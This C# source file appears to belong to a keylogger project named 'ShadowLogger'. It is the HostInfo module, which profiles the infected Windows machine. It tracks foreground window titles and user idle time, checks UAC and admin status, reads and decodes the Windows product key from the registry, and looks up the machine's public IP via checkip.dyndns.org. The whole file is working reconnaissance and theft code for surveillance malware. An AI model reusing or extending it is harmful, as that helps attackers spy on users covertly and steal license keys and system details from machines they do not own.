using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Management;
using System.Security;
using System.Security.Principal;
using System.Windows.Forms;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.HostInfo
{
    internal static class HostInfo
    {
        #region " P/Invoke Declarations "

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hwnd, System.Text.StringBuilder lpString, Int32 cch);


        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int ulOptions, int samDesired, ref IntPtr hkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegQueryValueEx(
            IntPtr hKey,
            string lpValueName,
            int lpReserved,
            int lpType,
            byte[] lpData,
            ref int lpcbData);

        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        #endregion

        #region " P/Invoke Variables "

        private static readonly IntPtr HKeyLocalMachine = new IntPtr(-2147483646);

        private const int KeyQueryValueWow64Key = 0x101;

        #endregion

        internal static IntPtr _GetForegroundWindow()
        {
            return GetForegroundWindow();
        }

        internal static string GetActiveWindowTitle(IntPtr hwnd)
        {
            StringBuilder windowTitle = new StringBuilder(256);

            if (!(hwnd == IntPtr.Zero))
            {
                GetWindowText(hwnd, windowTitle, windowTitle.Capacity);
            }
            else
            {
                GetWindowText(GetForegroundWindow(), windowTitle, windowTitle.Capacity);
            }
            return windowTitle.ToString();
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            [MarshalAs(UnmanagedType.U4)]
            internal UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            internal readonly Int32 dwTime;
        }

        internal static int GetIdleTime()
        {
            LASTINPUTINFO li = new LASTINPUTINFO();
            li.cbSize = (uint)Marshal.SizeOf(li);

            GetLastInputInfo(ref li);

            int idleMilliseconds = Environment.TickCount - li.dwTime;

            return idleMilliseconds / 1000; //Get seconds
        }
        
        internal static string UacStatus()
        {
            try
            {
                RegistryKey regkey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                if (regkey == null) return "N/A";

                object uacStatus =  regkey.GetValue("EnableLUA");

                if (uacStatus != null)
                {
                    return ((int)uacStatus == 0) ? "Disabled" : "Enabled";
                }
                return "N/A";
            }
            catch (SecurityException ex)
            {
                SharedMethods.LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                return "N/A";
            }
        }

        internal static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity); //This can't be null, R# false positive.
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        internal static void GetComputerTypeValue()
        {
            using (ManagementClass ct = new ManagementClass("win32_ComputerSystem"))
            {
                using (ManagementObjectCollection moc = ct.GetInstances())
                {
                    //PROPERTY NOT AVAILABLE ON Windows Server 2003, CHECK CURRENT OS BEFORE CALLING THIS.
                    foreach (ManagementBaseObject mocobject in moc)
                    {
                        GlobalVariables.GlobalVariables.ComputerType = mocobject.GetPropertyValue("PCSystemType").ToString(); //Can't return null or empty, no need to check.
                    }
                }
            }
        }

        internal static string GetComputerTypeAndPowerInfo(string type)
        {
            switch (type)
            {
                case "0":
                    type = "Unspecified";
                    break;
                case "2":
                    type = "Laptop";
                    break;
                default:
                    type = "Desktop";
                    break;
            }

            switch (SystemInformation.PowerStatus.PowerLineStatus)
            {
                case PowerLineStatus.Online:
                    return string.Format("{0} / {1}  ({2}%)", type, "AC", SystemInformation.PowerStatus.BatteryLifePercent * 100);
                case PowerLineStatus.Offline:
                    return string.Format("{0} / {1}  ({2}%)", type, "Battery", SystemInformation.PowerStatus.BatteryLifePercent * 100);
                default:
                    return string.Format("{0} / {1}", type, "Unknown");
            }
        }

        internal static string GetProductKey()
        {
            //USING P/Invoke BECAUSE OF REGISTRY REDIRECTION WHEN RUNNING IN SYSWOW64...
            //THERE'S NO .NET WAY OF DOING IT BELOW .NET FRAMEWORK 4.0

            const string valueName = "DigitalProductId";

            IntPtr keyHandle = IntPtr.Zero;

            RegOpenKeyEx(HKeyLocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\Currentversion", 0, KeyQueryValueWow64Key, ref keyHandle);

            if (keyHandle == IntPtr.Zero)
            {
                return "Error accessing registry key";
            }

            int hexLength = 0;

            RegQueryValueEx(keyHandle, valueName, 0, 0, null, ref hexLength);

            byte[] productKeyBuffer = new byte[hexLength];

            RegQueryValueEx(keyHandle, valueName, 0, 0, productKeyBuffer, ref hexLength);

            RegCloseKey(keyHandle);
            return DecodeProductKey(productKeyBuffer);
        }
        private static string DecodeProductKey(byte[] digitalProductId)
        {
            // Possible alpha-numeric characters in product key.
            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            // Length of decoded product key in byte-form. Each byte represents 2 chars.
            const int decodeStringLength = 15;
            // Decoded product key is of length 29
            char[] decodedChars = new char[29];

            // Extract encoded product key from bytes [52,67]
            List<byte> hexPid = new List<byte>();
            for (int i = 52; i <= 67; i++)
            {
                hexPid.Add(digitalProductId[i]);
            }

            // Decode characters
            for (int i = decodedChars.Length - 1; i >= 0; i--)
            {
                // Every sixth char is a separator.
                if ((i + 1)%6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    int digitMapIndex = 0;
                    for (int j = decodeStringLength - 1; j >= 0; j--)
                    {
                        int byteValue = (digitMapIndex << 8) | hexPid[j];
                        hexPid[j] = (byte) (byteValue/24);
                        digitMapIndex = byteValue%24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }
            }

            return new string(decodedChars);
        }

        internal static void GetIp()
        {
            string ipRequest = SharedMethods.CreateWebRequest("http://checkip.dyndns.org");
            if (ipRequest != string.Empty)
            {
                GlobalVariables.GlobalVariables.HostIp = new System.Text.RegularExpressions.Regex("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}").Matches(ipRequest)[0].ToString();
            }
            else
            {
                GlobalVariables.GlobalVariables.HostIp = string.Empty;
            }
        }

        internal static string GenerateArchitecture()
        {
            RegistryKey openSubKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0");
            if (openSubKey != null && openSubKey.GetValue("Identifier").ToString().Contains("x86"))
            {
                return "32-bits";
            }
            else
            {
                return "64-bits";
            }
        }

        internal static string GetOsFullName()
        {
            using (ManagementObjectCollection osInfo = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get())
            {
                foreach (ManagementBaseObject info in osInfo)
                {
                    using (info)
                    {
                        return info["Caption"].ToString();
                    }
                }
            }

            return null;
        }
    }
}
